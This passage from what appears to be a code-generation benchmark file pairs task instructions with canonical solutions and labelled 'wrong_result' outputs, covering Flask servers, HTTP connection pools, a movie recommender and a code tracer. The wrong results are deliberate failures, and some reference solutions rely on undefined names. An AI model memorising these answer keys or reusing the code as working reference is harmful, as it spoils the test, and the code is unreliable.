    "Canonical_solution": "from flask import Flask, request\nimport json\nfrom threading import Thread\nfrom queue import Queue\n\nclass Creator:\n    def __init__(self, learner_addr, collector_addr):\n        self.learner_addr = learner_addr\n        self.collector_addr = collector_addr\n        self.collector_demand = Queue()\n        self.learner_demand = Queue()\n        self.learners = {}\n        self.collectors = {}\n        self.end_flag = False\n\n    def set_target_source(self, learner_target, collector_target):\n        self.collector_demand.put(collector_target)\n        self.learner_demand.put(learner_target)\n\n    def start(self):\n        while not self.end_flag:\n            if self.learner_demand.empty() and self.collector_demand.empty():\n                continue\n            else:\n                learner_demand, collector_demand = None, None\n                if not self.learner_demand.empty():\n                    learner_demand = self.learner_demand.get()\n                if not self.collector_demand.empty():\n                    collector_demand = self.collector_demand.get()\n\n                for i in range(collector_demand):\n                    name, host, port = self.collector_addr[i]\n                    self.collectors[name] = NaiveCollector(host, port, prefix=DATA_PREFIX)\n                    self.collectors[name].start()\n                for i in range(learner_demand):\n                    name, host, port = self.learner_addr[i]\n                    self.learners[name] = NaiveLearner(host, port, prefix=DATA_PREFIX)\n                    self.learners[name].start()\n\n    def close(self):\n        self.end_flag = True\n        for t in self.learners.values():\n            t.close()\n        for t in self.collectors.values():\n            t.close()\n\n    @property\n    def current_resource(self):\n        collectors = {k: {} for k in self.collectors}\n        learners = {k: {} for k in self.learners}\n        return {\"collectors\": collectors, 'learners': learners}\n\nclass FlaskOperatorServer:\n    def __init__(self, creator, host: str, port: int, api_version: str = 'v1alpha1'):\n        self.app = Flask(__name__)\n        self.creator = creator\n        self.host = host\n        self.port = port\n        self.api_version = api_version\n        \n        @self.app.route('/{}/replicas'.format(self.api_version), methods=['POST'])\n        def post_replicas():\n            data = json.loads(request.data.decode())\n            collectors = data['collectors'][\"replicas\"]\n            learners = data['learners'][\"replicas\"]\n            self.creator.set_target_source(learners, collectors)\n            return {'success': True, 'code': 0, 'message': '', 'data': ''}\n\n        @self.app.route('/{}/replicas'.format(self.api_version), methods=['GET'])\n        def get_replicas():\n            data = json.loads(request.data.decode())\n            return {'success': True, 'code': 0, 'message': '', 'data': self.creator.current_resource}\n\n    def run(self):\n        self.app.run(host=self.host, port=self.port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask, request, jsonify\nfrom flask_restful import Resource, Api\n\nclass Creator:\n    def __init__(self):\n        self.learners = []\n        self.collectors = []\n\n    def scale_learners(self, count):\n        self.learners = [f\"learner_{i}\" for i in range(count)]\n\n    def scale_collectors(self, count):\n        self.collectors = [f\"collector_{i}\" for i in range(count)]\n\n    def get_replicas(self):\n        return {\n            \"learners\": self.learners,\n            \"collectors\": self.collectors\n        }\n\nclass FlaskOperatorServer:\n    def __init__(self, creator, host: str, port: int, api_version: str = 'v1alpha1'):\n        self.app = Flask(__name__)\n        self.api = Api(self.app)\n        self.creator = creator\n        self.host = host\n        self.port = port\n        self.api_version = api_version\n\n        self.api.add_resource(self.post_replicas, f'/{api_version}/replicas')\n        self.api.add_resource(self.get_replicas, f'/{api_version}/replicas')\n\n    def run(self):\n        self.app.run(host=self.host, port=self.port)\n\n    def post_replicas(self):\n        data = request.get_json()\n        desired_learners = data.get('learners', 0)\n        desired_collectors = data.get('collectors', 0)\n        self.creator.scale_learners(desired_learners)\n        self.creator.scale_collectors(desired_collectors)\n        return jsonify({\"status\": \"success\", \"message\": \"Replicas updated\"})\n\n    def get_replicas(self):\n        replicas = self.creator.get_replicas()\n        return jsonify(replicas)"
  },
  {
    "Task_id": 15,
    "Instruction": "Task Description: Implement an HTTP connection pool class to manage and reuse HTTP connections efficiently, handling connection creation, request execution, and response processing with support for retries, timeouts, and proxy configurations.\n\nClass Description: HTTPConnectionPool is a connection pooling class that manages HTTP connections to a specific host, providing methods to create connections, make requests, and handle responses with configurable timeouts and retries.\n\nAttributes:\n\nscheme: str - The URL scheme (default \"http\")\nConnectionCls: class - The connection class to use (default HTTPConnection)\nhost: str - The target host for connections\nport: int - The target port for connections (default None)\ntimeout: Timeout - The timeout configuration for connections\nretries: Retry - The retry configuration for failed requests\nproxy: str - The proxy URL if configured (default None)\nproxy_headers: dict - Headers to use for proxy connections (default {})\nconn_kw: dict - Additional connection keyword arguments\n\nMethods:\n\n_new_conn() -> HTTPConnection - Creates and returns a new HTTP connection instance, incrementing the connection counter.\n\n_make_request(conn: HTTPConnection, method: str, url: str, timeout: Timeout = _Default, chunked: bool = False, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the specified connection, handling timeouts and errors. Returns the HTTP response.\n\nurlopen(method: str, url: str, body: Optional[bytes] = None, headers: Optional[dict] = None, retries: Optional[Retry] = None, redirect: bool = True, assert_same_host: bool = True, timeout: Timeout = _Default, pool_timeout: Optional[float] = None, release_conn: Optional[bool] = None, chunked: bool = False, **response_kw) -> HTTPResponse - Main method to open a URL using the connection pool, handling connection management, request execution, and response processing. Returns an HTTPResponse object.",
    "Canonical_solution": "from socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    EmptyPoolError,\n    MaxRetryError,\n    ProtocolError,\n    TimeoutError,\n    SSLError,\n    ProxyError,\n    ClosedPoolError,\n    NewConnectionError,\n)\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import get_host, parse_url\nfrom .response import HTTPResponse\nimport logging\nimport socket\nimport sys\nimport warnings\n\nlog = logging.getLogger(__name__)\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        self.num_connections += 1\n        log.debug(\n            \"Starting new HTTP connection (%d): %s:%s\",\n            self.num_connections,\n            self.host,\n            self.port or \"80\",\n        )\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw\n        )\n\n    def _make_request(\n        self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw\n    ):\n        self.num_requests += 1\n        timeout_obj = self._get_timeout(timeout)\n        timeout_obj.start_connect()\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            if chunked:\n                conn.request_chunked(method, url, **httplib_request_kw)\n            else:\n                conn.request(method, url, **httplib_request_kw)\n        except (SocketTimeout, BaseSSLError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=conn.timeout)\n            raise\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, \"sock\", None):\n            if read_timeout == 0:\n                raise ReadTimeoutError(\n                    self, url, \"Read timed out. (read timeout=%s)\" % read_timeout\n                )\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=read_timeout)\n            raise\n\n        return httplib_response\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        chunked=False,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        destination_scheme = parsed_url.scheme\n        headers = headers or self.headers\n        retries = retries or self.retries\n\n        conn = None\n        release_this_conn = release_conn\n        http_tunnel_required = connection_requires_http_tunnel(\n            self.proxy, self.proxy_config, destination_scheme\n        )\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            if http_tunnel_required:\n                self._prepare_proxy(conn)\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers,\n                chunked=chunked,\n            )\n\n            response = HTTPResponse.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn if not release_conn else None,\n                retries=retries,\n                **response_kw\n            )\n\n        except (EmptyPoolError, TimeoutError, SSLError, ProxyError, ProtocolError) as e:\n            if conn:\n                conn.close()\n                conn = None\n            raise\n\n        finally:\n            if release_this_conn and conn:\n                self._put_conn(conn)\n\n        return response",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "from urllib.request import HTTPConnection, urlopen\nfrom urllib.error import HTTPError, URLError\nimport socket\nimport time\nfrom typing import Optional, Dict, Any, Tuple, List, Union\n\nclass HTTPConnectionPool:\n    def __init__(self, scheme: str = \"http\", ConnectionCls: type = HTTPConnection, host: str = \"\", port: int = None, timeout: float = 10.0, retries: int = 3, proxy: str = None, proxy_headers: Dict[str, str] = {}, conn_kw: Dict[str, Any] = {}):\n        self.scheme = scheme\n        self.ConnectionCls = ConnectionCls\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.proxy = proxy\n        self.proxy_headers = proxy_headers\n        self.conn_kw = conn_kw\n        self.connections = {}\n        self._counter = 0\n\n    def _new_conn(self) -> HTTPConnection:\n        self._counter += 1\n        conn = self.ConnectionCls(self.host, self.port, **self.conn_kw)\n        return conn\n\n    def _make_request(self, conn: HTTPConnection, method: str, url: str, timeout: float = 10.0, chunked: bool = False, **httplib_request_kw) -> HTTPResponse:\n        try:\n            conn.settimeout(timeout)\n            if self.proxy:\n                proxy_url = self.proxy\n                if not proxy_url.startswith(\"http://\") and not proxy_url.startswith(\"https://\"):\n                    proxy_url = \"http://\" + proxy_url\n                proxy_host, proxy_port = proxy_url.split(\":\")\n                proxy_port = int(proxy_port)\n                conn.set_proxy(proxy_host, proxy_port, self.proxy_headers)\n            response = conn.request(method, url, **httplib_request_kw)\n            return response\n        except (socket.timeout, socket.error) as e:\n            raise URLError(f\"Socket error: {e}\")\n        except HTTPError as e:\n            raise HTTPError(f\"HTTP error: {e}\")\n        except Exception as e:\n            raise URLError(f\"Request error: {e}\")\n\n    def urlopen(self, method: str, url: str, body: Optional[bytes] = None, headers: Optional[Dict[str, str]] = None, retries: int = 3, redirect: bool = True, assert_same_host: bool = True, timeout: float = 10.0, pool_timeout: Optional[float] = None, release_conn: Optional[bool] = None, chunked: bool = False, **response_kw) -> HTTPResponse:\n        for i in range(self.retries):\n            try:\n                conn = self._new_conn()\n                if self.proxy:\n                    proxy_url = self.proxy\n                    if not proxy_url.startswith(\"http://\") and not proxy_url.startswith(\"https://\"):\n                        proxy_url = \"http://\" + proxy_url\n                    proxy_host, proxy_port = proxy_url.split(\":\")\n                    proxy_port = int(proxy_port)\n                    conn.set_proxy(proxy_host, proxy_port, self.proxy_headers)\n                if headers:\n                    conn.headers = headers\n                if body:\n                    conn.data = body\n                response = conn.request(method, url, body=body, headers=headers, chunked=chunked)\n                if response.status >= 400:\n                    raise HTTPError(f\"HTTP error: {response.status}\")\n                return response\n            except (socket.timeout, socket.error) as e:\n                if i == self.retries - 1:\n                    raise URLError(f\"Socket error: {e}\")\n                time.sleep(1)\n            except HTTPError as e:\n                if i == self.retries - 1:\n                    raise HTTPError(f\"HTTP error: {e}\")\n                time.sleep(1)\n            except Exception as e:\n                if i == self.retries - 1:\n                    raise URLError(f\"Request error: {e}\")\n                time.sleep(1)\n        return response"
  },
  {
    "Task_id": 158,
    "Instruction": "Task Description: Create a Flask-based web application for movie recommendations that handles user requests, processes movie data, and returns recommendations along with detailed movie information.\n\nFunction Description: The application consists of three main routes that handle different aspects of movie recommendations: displaying the home page with suggestions, finding similar movies based on user input, and providing detailed recommendations for a selected movie.\n\nInput:\n- For \"/\" and \"/home\" routes: None (GET requests)\n- For \"/similarity\" route: A POST request with form data containing 'name' (movie title)\n- For \"/recommend\" route: A POST request with form data containing multiple movie attributes (title, cast info, IMDB ID, etc.)\n\nOutput:\n- For \"/\" and \"/home\" routes: Rendered HTML template 'home.html' with movie suggestions\n- For \"/similarity\" route: Either an error string or a string of recommended movies joined by \"---\"\n- For \"/recommend\" route: Rendered HTML template 'recommend.html' with comprehensive movie details, recommendations, and reviews\n\nMethods:\n1. home() -> HTML - Displays the home page with movie suggestions\n2. similarity() -> str - Returns similar movies based on user input\n3. recommend() -> HTML - Provides detailed recommendations for a selected movie",
    "Canonical_solution": "from flask import Flask, render_template, request\n\napp = Flask(__name__)\n\n@app.route(\"/\")\n@app.route(\"/home\")\ndef home():\n    suggestions = get_suggestions()\n    return render_template('home.html',suggestions=suggestions)\n\n@app.route(\"/similarity\",methods=[\"POST\"])\ndef similarity():\n    movie = request.form['name']\n    rc = rcmd(movie)\n    if type(rc)==type('string'):\n        return rc\n    else:\n        m_str=\"---\".join(rc)\n        return m_str\n\n@app.route(\"/recommend\",methods=[\"POST\"])\ndef recommend():\n    title = request.form['title']\n    cast_ids = request.form['cast_ids']\n    cast_names = request.form['cast_names']\n    cast_chars = request.form['cast_chars']\n    cast_bdays = request.form['cast_bdays']\n    cast_bios = request.form['cast_bios']\n    cast_places = request.form['cast_places']\n    cast_profiles = request.form['cast_profiles']\n    imdb_id = request.form['imdb_id']\n    poster = request.form['poster']\n    genres = request.form['genres']\n    overview = request.form['overview']\n    vote_average = request.form['rating']\n    vote_count = request.form['vote_count']\n    release_date = request.form['release_date']\n    runtime = request.form['runtime']\n    status = request.form['status']\n    rec_movies = request.form['rec_movies']\n    rec_posters = request.form['rec_posters']\n\n    suggestions = get_suggestions()\n\n    rec_movies = convert_to_list(rec_movies)\n    rec_posters = convert_to_list(rec_posters)\n    cast_names = convert_to_list(cast_names)\n    cast_chars = convert_to_list(cast_chars)\n    cast_profiles = convert_to_list(cast_profiles)\n    cast_bdays = convert_to_list(cast_bdays)\n    cast_bios = convert_to_list(cast_bios)\n    cast_places = convert_to_list(cast_places)\n    \n    cast_ids = cast_ids.split(',')\n    cast_ids[0] = cast_ids[0].replace(\"[\",\"\")\n    cast_ids[-1] = cast_ids[-1].replace(\"]\",\"\")\n    \n    for i in range(len(cast_bios)):\n        cast_bios[i] = cast_bios[i].replace(r'\\n', '\\n').replace(r'\\\"','\\\"')\n    \n    movie_cards = {rec_posters[i]: rec_movies[i] for i in range(len(rec_posters))}\n    \n    casts = {cast_names[i]:[cast_ids[i], cast_chars[i], cast_profiles[i]] for i in range(len(cast_profiles))}\n\n    cast_details = {cast_names[i]:[cast_ids[i], cast_profiles[i], cast_bdays[i], cast_places[i], cast_bios[i]] for i in range(len(cast_places))}\n\n    sauce = urllib.request.urlopen('https://www.imdb.com/title/{}/reviews?ref_=tt_ov_rt'.format(imdb_id)).read()\n    soup = bs.BeautifulSoup(sauce,'lxml')\n    soup_result = soup.find_all(\"div\",{\"class\":\"text show-more__control\"})\n\n    reviews_list = []\n    reviews_status = []\n    for reviews in soup_result:\n        if reviews.string:\n            reviews_list.append(reviews.string)\n            movie_review_list = np.array([reviews.string])\n            movie_vector = vectorizer.transform(movie_review_list)\n            pred = clf.predict(movie_vector)\n            reviews_status.append('Good' if pred else 'Bad')\n\n    movie_reviews = {reviews_list[i]: reviews_status[i] for i in range(len(reviews_list))}     \n\n    return render_template('recommend.html',title=title,poster=poster,overview=overview,vote_average=vote_average,\n        vote_count=vote_count,release_date=release_date,runtime=runtime,status=status,genres=genres,\n        movie_cards=movie_cards,reviews=movie_reviews,casts=casts,cast_details=cast_details)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```html\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Movie Recommendations</title>\n</head>\n<body>\n    <h1>Welcome to Movie Recommendations</h1>\n    <p>This is the home page with movie suggestions.</p>\n</body>\n</html>\n```"
  },
  {
    "Task_id": 16,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages HTTP connections to a server, handling connection creation, request sending, and response retrieval with support for retries, timeouts, and connection reuse.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP/HTTPS connections that provides efficient connection reuse and handles various network-related exceptions. It supports configurable timeouts, retries, and proxy settings.\n\nAttributes:\n- scheme: str - The URL scheme (http/https) for connections\n- host: str - The target server hostname\n- port: int - The target server port (optional)\n- timeout: Timeout - Connection and read timeout configuration\n- retries: Retry - Retry configuration for failed requests\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with configuration parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection instance\n- _make_request(conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw) -> HTTPResponse - Sends an HTTP request through the given connection and returns the response\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw) -> HTTPResponse - Main method to open a URL with retry and timeout handling, managing connection lifecycle",
    "Canonical_solution": "from socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n)\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import parse_url\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw\n        )\n\n    def _make_request(\n        self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw\n    ):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            if chunked:\n                conn.request_chunked(method, url, **httplib_request_kw)\n            else:\n                conn.request(method, url, **httplib_request_kw)\n\n        except (BrokenPipeError, IOError) as e:\n            if getattr(e, 'errno', None) not in {errno.EPIPE, errno.ESHUTDOWN, errno.EPROTOTYPE}:\n                raise\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, 'sock', None):\n            if read_timeout == 0:\n                raise ReadTimeoutError(\n                    self, url, f\"Read timed out. (read timeout={read_timeout}\"\n                )\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=read_timeout)\n            raise\n\n        return httplib_response\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        chunked=False,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        if headers is None:\n            headers = self.headers\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)\n\n        if assert_same_host and not self.is_same_host(url):\n            raise HostChangedError(self, url, retries)\n\n        conn = None\n        release_this_conn = release_conn\n        clean_exit = False\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._new_conn()\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers,\n                chunked=chunked,\n            )\n\n            clean_exit = True\n\n        except EmptyPoolError:\n            clean_exit = True\n            release_this_conn = False\n            raise\n\n        except (\n            SocketError,\n            ProtocolError,\n            MaxRetryError,\n            SSLError,\n            ProxyError,\n        ) as e:\n            clean_exit = False\n            if isinstance(e, (SocketError, ProtocolError)):\n                e = ProtocolError(\"Connection aborted.\", e)\n\n            retries = retries.increment(\n                method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\n            )\n            retries.sleep()\n            err = e\n\n        finally:\n            if not clean_exit:\n                conn = conn and conn.close()\n                release_this_conn = True\n\n            if release_this_conn:\n                self._put_conn(conn)\n\n        if not conn:\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        return httplib_response",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import socket\nimport time\nfrom urllib3 import HTTPConnectionPool, Timeout, Retry\nfrom urllib3.connection import HTTPConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import MaxRetryError, ConnectionError, TimeoutError\n\nclass HTTPConnectionPool(HTTPConnectionPool):\n    def __init__(self, host, port=None, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        super().__init__(host, port=port, timeout=timeout, maxsize=maxsize, block=block, headers=headers, retries=retries, _proxy=_proxy, _proxy_headers=_proxy_headers, **conn_kw)\n\n    def _new_conn(self):\n        return HTTPConnection(self.host, self.port, **self.conn_kw)\n\n    def _make_request(self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw):\n        return super()._make_request(conn, method, url, timeout=timeout, chunked=chunked, **httplib_request_kw)\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw):\n        if retries is None:\n            retries = self.retries\n        if timeout is None:\n            timeout = self.timeout\n        if pool_timeout is None:\n            pool_timeout = self.timeout\n        try:\n            return super().urlopen(method, url, body=body, headers=headers, retries=retries, redirect=redirect, assert_same_host=assert_same_host, timeout=timeout, pool_timeout=pool_timeout, release_conn=release_conn, chunked=chunked, **response_kw)\n        except MaxRetryError:\n            raise\n        except ConnectionError as e:\n            if self.retries.max_retries > 0:\n                time.sleep(self.retries.backoff_factor)\n                return self.urlopen(method, url, body=body, headers=headers, retries=retries, redirect=redirect, assert_same_host=assert_same_host, timeout=timeout, pool_timeout=pool_timeout, release_conn=release_conn, chunked=chunked, **response_kw)\n            else:\n                raise\n        except TimeoutError:\n            if self.retries.max_retries > 0:\n                time.sleep(self.retries.backoff_factor)\n                return self.urlopen(method, url, body=body, headers=headers, retries=retries, redirect=redirect, assert_same_host=assert_same_host, timeout=timeout, pool_timeout=pool_timeout, release_conn=release_conn, chunked=chunked, **response_kw)\n            else:\n                raise"
  },
  {
    "Task_id": 161,
    "Instruction": "Task Description: Create a Flask-based web server that serves a pre-trained scikit-learn sentiment analysis model, allowing users to submit text via a web form and receive sentiment predictions.\n\nFunction Description: The code implements a simple web application with Flask that loads a pre-trained sentiment analysis model and provides both a web interface for user interaction and an API endpoint for predictions.\n\nInput:\n- None (for the Flask app initialization)\n- Optional 'text' query parameter (for the prediction functionality)\n\nOutput:\n- HTML page with a form and prediction results (when accessed via web browser)\n- Text prediction result (when accessed programmatically)\n\nClass Description: N/A (The reference code is function-based rather than class-based)\n\nAttributes: N/A\n\nMethods:\n- pred(text: str) -> str - Takes a text string as input and returns the sentiment prediction using the loaded model\n- index() -> str - Handles the root route ('/'), processes GET requests with optional 'text' parameter, and returns an HTML response with the form and prediction results",
    "Canonical_solution": "from sklearn.externals import joblib\nfrom flask import Flask, request\nfrom jinja2 import Template\n\np = joblib.load('sentiment-model.pkl')\napp = Flask(__name__)\n\ndef pred(text):\n    return p.predict([text])[0]\n\n@app.route('/')\ndef index():\n    text = request.args.get('text')\n    if text:\n        prediction = pred(text)\n    else:\n        prediction = \"\"\n\n    template = Template(\"\"\"\n    <html>\n        <body>\n            <h1>Scikit Model Server</h1>\n            <form>\n                <input type=\"text\" name=\"text\">\n                <input type=\"submit\" >\n            </form>\n            <p>Prediction: {{ prediction }}</p>\n        </body>\n    </html>\n    \"\"\")\n    return template.render(prediction=prediction)\n\nif __name__ == '__main__':\n    app.run(port=8000)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask, request, render_template_string\nimport joblib\n\napp = Flask(__name__)\n\n# Load the pre-trained model\nmodel = joblib.load('sentiment_model.pkl')\n\ndef pred(text: str) -> str:\n    return model.predict([text])[0]\n\n@app.route('/', methods=['GET'])\ndef index():\n    text = request.args.get('text')\n    result = pred(text) if text else ''\n    return render_template_string('''\n        <html>\n            <body>\n                <h2>Sentiment Analysis</h2>\n                <form method=\"get\">\n                    <label for=\"text\">Enter text:</label>\n                    <input type=\"text\" id=\"text\" name=\"text\" value=\"{{ text }}\">\n                    <button type=\"submit\">Predict</button>\n                </form>\n                {% if text %}\n                    <h3>Prediction Result:</h3>\n                    <p>{{ result }}</p>\n                {% endif %}\n            </body>\n        </html>\n    ''', text=text, result=result)\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 164,
    "Instruction": "Task Description: Create a Python function that sets up a real-time code tracing and visualization system using Flask to serve a web interface for monitoring execution patterns.\n\nFunction Description: The `trace` function establishes a web-based visualization tool that tracks and displays Python code execution in real-time. It creates a Flask web server that shows which lines of code are being executed most frequently, with features like heatmap visualization and stack trace inspection. The function uses Python's sys.settrace() mechanism to monitor execution and organizes the data for web display.\n\nInput:\n- files: [Optional callable] - A function to filter which files should be traced (default: None)\n- port: [int] - Port number for the web server (default: 9999)\n- host: [str] - Host address for the server (default: '127.0.0.1')\n- browser: [bool] - Whether to automatically open browser (default: False)\n- daemon: [bool] - Whether to run server as daemon thread (default: False)\n\nOutput:\n- None (The function runs indefinitely, serving the web interface and collecting trace data)\n\nThe function:\n1. Sets up tracing for the calling frame and specified files\n2. Creates a Flask web server with multiple routes for visualization\n3. Starts a background thread for the web server\n4. Configures sys.settrace() to collect execution data\n5. Optionally opens a browser window to display the visualization",
    "Canonical_solution": "import inspect\nimport logging\nimport sys\nimport threading\nimport webbrowser\nfrom collections import defaultdict, deque, Counter\nfrom functools import lru_cache\nfrom itertools import islice, takewhile\nfrom flask import Flask, render_template, jsonify, url_for, request\n\ndef trace(\n        files=None,\n        port=9999,\n        host='127.0.0.1',\n        browser=False,\n        daemon=False,\n):\n    calling_frame = inspect.currentframe().f_back\n    calling_file = calling_frame.f_code.co_filename\n\n    @lru_cache(maxsize=None)\n    def include_file(path):\n        try:\n            return path == calling_file or files(path)\n        except Exception:\n            return False\n\n    thread_ident = threading.get_ident()\n    queues = defaultdict(lambda: deque(maxlen=2 ** 10))\n    totals = defaultdict(Counter)\n\n    app = Flask(__name__)\n\n    host_is_local = host in [\"127.0.0.1\", \"localhost\"]\n    if host_is_local:\n        app.config[\"SERVER_NAME\"] = \"{host}:{port}\".format(host=host, port=port)\n\n    @app.route('/')\n    def index():\n        return render_template('index.html', files=sorted(queues.keys()))\n\n    @app.route('/file/')\n    def file_view():\n        return render_template(\"file.html\", **file_table_context())\n\n    def file_table_context():\n        filename = request.args['filename']\n        source = Source.for_filename(filename)\n        queue = queues[filename]\n\n        highlighted = highlight_ranges(source, frames_matching(filename))\n        highlighted_lines = list(enumerate(highlighted.splitlines()))\n        \n        counters = [\n            queue_counter(queue, 2 ** i)\n            for i in range(10 + 1)\n        ]\n\n        ratios = [\n            [\n                counter[i + 1] / min(2 ** c, len(queue) or 1)\n                * (c + 1) / 10\n                for c, counter in enumerate(counters)\n            ]\n            for i, _ in highlighted_lines\n        ]\n\n        max_ratio = max(map(max, ratios)) or 1\n\n        rows = [\n            (\n                i + 1,\n                totals[filename][i + 1] or '',\n                reversed([\n                    int(round(ratio / max_ratio * 100))\n                    for ratio in ratios[i]\n                ]),\n                line,\n            )\n            for i, line in highlighted_lines\n        ]\n\n        return dict(\n            rows=rows,\n            zip=zip,\n            lightnesses=[int((i + 1) * 100 / (10 + 1)) for i in range(10 + 1)],\n            filename=filename,\n            highlighted=highlighted,\n        )\n\n    @app.route('/table/')\n    def file_table_view():\n        return render_template('file_table.html', **file_table_context())\n\n    def current_frame():\n        return sys._current_frames()[thread_ident]\n\n    def frames_matching(filename):\n        frame = current_frame()\n        while frame:\n            if frame.f_code.co_filename == filename:\n                yield frame\n            frame = frame.f_back\n\n    @app.route('/stacktrace/')\n    def stacktrace():\n        def gen():\n            frame = current_frame()\n            while frame:\n                code = frame.f_code\n                filename = code.co_filename\n                name = Source.for_frame(frame).code_qualname(code)\n                yield (\n                    filename,\n                    frame.f_lineno,\n                    name,\n                    highlight_stack_frame(frame),\n                    include_file(filename)\n                )\n                frame = frame.f_back\n\n        return jsonify(list(takewhile(\n            lambda entry: not (\n                    'heartrate' in entry[0]\n                    and entry[2].endswith(trace_func.__name__)),\n            list(gen())[::-1]\n        )))\n\n    threading.Thread(\n        target=lambda: app.run(\n            debug=False,\n            host=host,\n            port=port,\n        ),\n        daemon=daemon,\n    ).start()\n\n    def trace_func(frame, event, _arg):\n        filename = frame.f_code.co_filename\n        if event == \"call\":\n            if include_file(filename):\n                return trace_func\n\n        elif event 